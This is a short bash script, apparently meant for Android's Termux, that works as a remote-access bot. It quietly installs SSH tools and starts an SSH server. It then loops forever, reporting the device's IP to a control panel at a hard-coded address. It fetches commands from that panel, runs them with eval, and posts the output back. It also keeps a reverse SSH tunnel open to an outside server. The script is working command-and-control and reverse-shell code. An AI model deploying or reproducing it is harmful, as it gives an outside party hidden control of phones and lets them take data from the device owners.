#!/bin/bash

SERVER="37.237.185.27"
PANEL="http://37.237.185.27:5000"
SSH_PORT="7902"
USER="ali"
BASE=2200

pkg update -y >/dev/null 2>&1
pkg install -y openssh autossh curl >/dev/null 2>&1

sshd

DEV=$(whoami)
ID=$(echo $DEV | tr -dc '0-9')
PORT=$((BASE+ID))

mkdir -p ~/.ssh
[ -f ~/.ssh/id_rsa ] || ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa >/dev/null 2>&1

while true
do
  IP=$(curl -s ifconfig.me)

  curl -X POST $PANEL/register \
  -d "device=$DEV&port=$PORT&ip=$IP" >/dev/null 2>&1

  CMD=$(curl -s $PANEL/getcmd)
  if [ ! -z "$CMD" ]; then
    OUT=$(eval $CMD 2>&1)
    curl -X POST $PANEL/out -d "data=$OUT" >/dev/null 2>&1
  fi

  autossh -M 0 -N -R $PORT:localhost:8022 -p $SSH_PORT $USER@$SERVER

  sleep 10
done
